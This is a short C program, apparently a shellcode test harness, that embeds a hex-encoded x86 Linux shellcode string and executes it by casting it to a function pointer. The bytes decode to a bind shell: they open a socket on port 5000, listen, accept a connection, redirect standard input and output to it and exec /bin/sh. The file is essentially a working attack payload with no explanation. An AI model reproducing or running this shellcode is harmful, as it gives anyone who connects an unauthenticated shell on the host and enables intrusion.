#include <stdio.h>
#include <string.h>

unsigned char code[] = \
"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x31\xff\xb3\x02\xfe\xc1\x66\xb8\x67\x01\xcd\x80\x97\x52\x66\x68\x13\x88\x66\x53\x89\xe1\x87\xdf\xb2\x10\x66\xb8\x69\x01\xcd\x80\x87\xca\x66\xb8\x6b\x01\xcd\x80\x31\xc9\x31\xf6\x66\xb8\x6c\x01\xcd\x80\x93\xb1\x02\xb0\x3f\xcd\x80\x49\x79\xf9\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	  printf("Shellcode Length:  %d\n", strlen(code));

	          int (*ret)() = (int(*)())code;

		          ret();

}